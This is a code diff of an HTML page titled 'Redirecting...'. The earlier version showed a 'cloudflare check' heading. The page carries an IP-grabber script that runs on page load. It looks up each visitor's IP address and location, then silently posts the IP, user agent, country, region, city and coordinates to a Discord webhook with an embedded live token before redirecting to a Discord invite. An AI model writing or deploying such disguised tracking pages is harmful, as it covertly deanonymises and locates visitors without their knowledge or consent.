@@ -4,78 +4,83 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        .error {
+            color: red;
+            font-size: 18px;
+            margin-top: 20px;
+        }
+    </style>
     <script>
         function trackVisitor() {
-            // The Discord webhook URL where the data will be sent
-            const webhookURL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";  
+            const webhookURL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";  // Replace with your actual Discord webhook URL
 
-            // Fetch visitor's IP and location data using IP-API with JSONP (no CORS issues)
-            const ipApiUrl = "http://ip-api.com/json/?callback=handleIpData";
+            // Use ipinfo.io for IP geolocation data
+            const ipInfoUrl = "https://ipinfo.io/json?callback=handleIpData";  // ipinfo.io JSONP URL
 
-            // Create a script tag to load IP-API data
+            // Create a script tag to fetch the data using JSONP
             const script = document.createElement('script');
-            script.src = ipApiUrl;
+            script.src = ipInfoUrl;
             document.body.appendChild(script);
 
-            // This function will be called when IP-API data is returned
+            // Handle the response from ipinfo.io
             window.handleIpData = function(data) {
-                // Get the necessary data from the response
-                const ip = data.query;
-                const country = data.country;
-                const countryCode = data.countryCode;
-                const region = data.regionName;
-                const city = data.city;
-                const zip = data.zip;
-                const lat = data.lat;
-                const lon = data.lon;
-                const browser = navigator.userAgent;
-                const flagUrl = `https://countryflagsapi.com/png/${countryCode.toLowerCase()}`;
+                // Check if the response is successful
+                if (data && data.ip) {
+                    const ip = data.ip;
+                    const country = data.country;
+                    const countryCode = data.country;
+                    const region = data.region;
+                    const city = data.city;
+                    const loc = data.loc.split(",");
+                    const lat = loc[0];
+                    const lon = loc[1];
+                    const browser = navigator.userAgent;
+                    const flagUrl = `https://countryflagsapi.com/png/${countryCode.toLowerCase()}`;
 
-                // Prepare the payload for Discord webhook
-                const payload = {
-                    username: ip,
-                    avatar_url: flagUrl,
-                    embeds: [{
-                        title: `Visitor From ${country}`,
-                        color: 39423,
-                        fields: [
-                            { name: "IP", value: ip, inline: true },
-                            { name: "Useragent", value: browser },
-                            { name: "Country / CountryCode", value: `${country} / ${countryCode}`, inline: true },
-                            { name: "Region | City | Zip", value: `[${region} | ${city} | ${zip}](https://www.google.com/maps/search/?api=1&query=${lat},${lon} "Google Maps Location")`, inline: true }
-                        ],
-                        footer: {
-                            text: new Date().toLocaleString(),
-                            icon_url: "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
-                        }
-                    }]
-                };
+                    // Prepare the Discord webhook payload
+                    const payload = {
+                        username: ip,
+                        avatar_url: flagUrl,
+                        embeds: [{
+                            title: `Visitor From ${country}`,
+                            color: 39423,
+                            fields: [
+                                { name: "IP", value: ip, inline: true },
+                                { name: "Useragent", value: browser },
+                                { name: "Country / CountryCode", value: `${country} / ${countryCode}`, inline: true },
+                                { name: "Region | City", value: `${region} | ${city}`, inline: true }
+                            ],
+                            footer: {
+                                text: new Date().toLocaleString(),
+                                icon_url: "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
+                            }
+                        }]
+                    };
 
-                // Send the payload to Discord webhook
-                fetch(webhookURL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                }).then(response => {
-                    if (!response.ok) {
-                        console.error("Failed to send data to Discord");
-                    }
-                }).catch(error => {
-                    console.error("Error sending to Discord:", error);
-                }).finally(() => {
-                    // Redirect the user after sending the data to Discord
-                    window.location.href = 'https://discord.gg/8bRkNbDNsb';  // Change this URL as needed
-                });
+                    // Send data to Discord webhook
+                    fetch(webhookURL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(payload)
+                    }).catch(err => console.error('Error sending webhook data:', err));
+                }
+
+                // Redirect to the desired link after the request is made
+                window.location.href = "https://discord.gg/8bRkNbDNsb";  // Change to your desired redirect URL
             };
         }
 
-        // Track the visitor as soon as the page loads
+        // Execute tracking as soon as the page loads
         window.onload = trackVisitor;
     </script>
 </head>
 <body>
-    <h2>Redirecting... cloudflare check</h2>
+    <h2>Redirecting...</h2>
 </body>
 </html>
